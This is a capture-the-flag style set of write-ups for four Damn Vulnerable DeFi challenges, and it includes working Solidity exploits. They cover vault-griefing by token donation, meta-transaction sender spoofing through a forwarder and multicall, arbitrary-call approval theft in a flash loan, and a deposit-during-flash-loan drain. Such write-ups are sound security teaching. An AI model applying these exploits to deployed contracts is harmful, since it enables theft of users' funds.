# Write Ups

<!-- MarkdownTOC levels="1,2" autolink="true" -->

- [01 Unstoppable](#01-unstoppable)
- [02 Naive Receiver](#02-naive-receiver)
- [03 Truster](#03-truster)
- [04 Side Entrance](#04-side-entrance)
- [Template](#template)

<!-- /MarkdownTOC -->

## 01 Unstoppable

### Challenge

> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
>
> To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.
>
> Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.

### Solution

Notice the following guard:

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

`convertToShares` will take the given **assets** (underlying token) and compute the amount of **shares**.

As it can be seen that `balanceBefore` is a measure of the **assets** in the vault, then there is a problem of units we can leverage.

Since `(convertToShares(totalSupply)` is `total shares * (total shares / total assets)`, and this quantity has to be equal to `total assets` (`balanceBefore`), it follows that if we manage to make the total of shares different to the total of assets, we would make the guard fail, preventing flash loans to work.

How do we pertub this ratio? We cannot mint or burn shares without `deposit` or `withdraw`. What we can do instead is incrementing the amount of the underlying asset (`DVT`) in the vault, with a simple `transfer()`.

```solidity
token.transfer(address(level.vault()), 1);
```

By transfering a single `DVT` token, the values checked at the guard will be different, breaking the flash loan.

### References

* https://eips.ethereum.org/EIPS/eip-4626
* https://ethereum.org/es/developers/docs/standards/tokens/erc-4626/
* https://eips.ethereum.org/EIPS/eip-3156

## 02 Naive Receiver

### Challenge

> There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract.
>
> A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.
>
> All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.

### Solution

#### Draining the `receiver` contract

We noticed that the pool has a significant fee:

```solidity
uint256 private constant FIXED_FEE = 1e18; // not the cheapest flash loan
```

Additionally, by inspecting the `pool.flashLoan()` function, we observed that there are no controls to prevent a user from issuing a flash loan on behalf of another.

Since the receiver contract has 10 WETH, we can drain its funds with 10 flash loans.

#### `pool.withdraw()` and `pool._msgSender()`

We will use the `pool.withdraw()` function to retrieve the funds from the pool.

We can invoke it with any receiver we choose, with the line `deposits[_msgSender()] -= amount;` serving as a safeguard.

The `deployer` user owns all the funds. Therefore, if we can manipulate the `_msgSender()` function to return the deployer's address, we will be able to recover all the funds.

```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}
```

The `_msgSender()` function will return the deployer's address if two conditions are met:

* `msg.sender` must be the address of the `trustedForwarder`, meaning the call needs to be made using this contract.
* The last 20 bytes of the call's payload must contain the deployer's address.

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}
```

#### `BasicForwarder.execute()`

`BasicForwarder` is a contract that allows you to issue meta-transactions. In essence, you **sign** some transaction data and pass it to this forwarder, which then sends it on your behalf.

This works by the user filling out a struct:

```solidity
struct Request {
    address from;
    address target;
    uint256 value;
    uint256 gas;
    uint256 nonce;
    bytes data;
    uint256 deadline;
}
```

When invoking the contract with `BasicForwarder.execute()`, certain controls are executed.

We are particularly interested in:

```solidity
function _checkRequest(Request calldata request, bytes calldata signature) private view {
    // [...]
    address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
    if (signer != request.from) revert InvalidSigner();
}
```

and how the call is constructed and sent:

```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    // [...]

    bytes memory payload = abi.encodePacked(request.data, request.from);

    // [...]
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
        gasLeft := gas()
    }

    // [...]
}
```

In this case, while `msg.sender` will effectively become the forwarder’s address, the payload will contain the user’s address as its last 20 bytes, preventing us from spoofing the `deployer`.

To complete the attack, we would need an additional layer.

#### `pool.multicall()` (from `Multicall`)

The `pool.multicall()` function is added to the `NaiveReceiverPool` via inheritance:

```solidity
contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
    // [...]
}
```

This function iterates over an array of `bytes`, performing delegate calls:

```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}
```

This should work to complete the attack:

* Since it uses `DELEGATECALL`, invoking `multicall()` from the forwarder would keep the latter as `msg.sender`.
* The `multicall()` function will process the payload provided by the forwarder, removing the `bytes` array from it, allowing us to attach the deployer’s address as the last 20 bytes to any element in the array.

#### Putting Everything Together

The attack does not require us to build a separate `Attacker` contract. The steps are as follows:

* Set up the `bytes` array for `multicall()`.
* Add 10 `flashLoan` calls to this array on behalf of the `receiver`, each borrowing 1 wei. This will drain the funds from the `receiver` contract and make them available for withdrawal.
* Add 1 call to `withdraw()`, sending all the funds to the `recovery` address. Ensure the `deployer` address bytes are appended at the end to enable the spoofing to work.
* Prepare the `BasicForwarder.Request` object to call the `multicall()` function with the prepared payload. This way, we can "strip" the player’s address from the payload.
* Sign this `Request` object as the `player` to pass the controls.
* Execute the call.

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory data = new bytes[](11); // 11
    for (uint8 i = 0; i < 10; i++) {
        data[i] = abi.encodePacked(abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 1 wei, "0x"));
    }
    data[10] = abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, recovery), deployer);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 2000000, // value arbitrarily chosen
        nonce: 0,
        data: abi.encodeWithSelector(pool.multicall.selector, data),
        deadline: block.timestamp
    });

    bytes32 digest = forwarder.getDataHash(request);
    bytes32 hashTypedData = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), digest));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, hashTypedData);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
```

### References

* The X user `0xaleko` [solves and explains this challenge](https://x.com/0xaleko/status/1815150400510505024).
* [NaiveReceiver.t.sol](https://github.com/alekoisaev/damn-vulnerable-defi/blob/v4-solutions/test/naive-receiver/NaiveReceiver.t.sol) by [@alekoisaev](https://github.com/alekoisaev).

## 03 Truster

### Challenge

> More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
>
> The pool holds 1 million DVT tokens. You have nothing.
>
> To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### Solution

This attack exploits a vulnerability in the flash loan implementation, enabling an attacker to drain all ERC20 tokens held by the pool. The issue stems from the flash loan function’s use of `target.functionCall(data)` without proper validation of the `data` passed in, allowing arbitrary function calls on the target contract. Specifically, an attacker can invoke the `approve` function on the ERC20 token, granting themselves permission to withdraw all tokens from the pool.

To execute the exploit, we must deploy an `Attacker` contract. This separation is necessary to comply with nonce checks in the protocol’s success conditions.

```solidity
function test_truster() public checkSolvedByPlayer {
    // Perform the attack from another contract to comply with the nonce check.
    // If executed here, the nonce will remain 0, failing the success condition.
    Attacker attacker = new Attacker(pool, token, player, recovery);
    attacker.attack();
}
```

The `Attacker` contract requests a flash loan of 0 tokens. Since the flash loan function does not validate the amount, no tokens are actually loaned or need to be returned.

During the flash loan execution, the `target.functionCall(data)` line is exploited to call the ERC20 token’s `approve` function. The attacker sets their own address as the spender with maximum allowance.

With the approval in place, the attacker then calls `transferFrom` to move all tokens from the pool to their recovery address.

```solidity
function attack() public {
    // Encode the selector and arguments separately, not nested.
    // This attack leverages `target.functionCall(data)` in flashLoan to
    // grant ERC20 approval and drain the pool’s funds.
    bytes memory data = abi.encodeWithSelector(
        token.approve.selector, address(this), type(uint256).max
    );

    // flashLoan does not check amount = 0, so no funds need to be returned.
    pool.flashLoan(0, address(this), address(token), data);

    // transferFrom checks if msg.sender has sufficient allowance; transfer funds now.
    token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
}
```

### References

* https://eips.ethereum.org/EIPS/eip-20

## 04 Side Entrance

### Challenge

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
>
> You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

### Solution

The `flashLoan` function checks that the contract's balance remains the same after the loan is issued:

```solidity
if (address(this).balance < balanceBefore) {
    revert RepayFailed();
}
```

If we take out a loan and deposit those funds back into the pool, the pool's balance remains unchanged, but our internal balance entry reflects the deposited amount:

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

After depositing, we simply withdraw our funds:

```solidity
contract Attacker {
    SideEntranceLenderPool internal pool;
    address internal recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() public {
        pool.flashLoan(1000 ether);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {
        payable(recovery).transfer(msg.value);
    }
}
```

--------------------------------------------------------------------------------
## Template

### Challenge

>

### Solution

* ???

### References

* ???
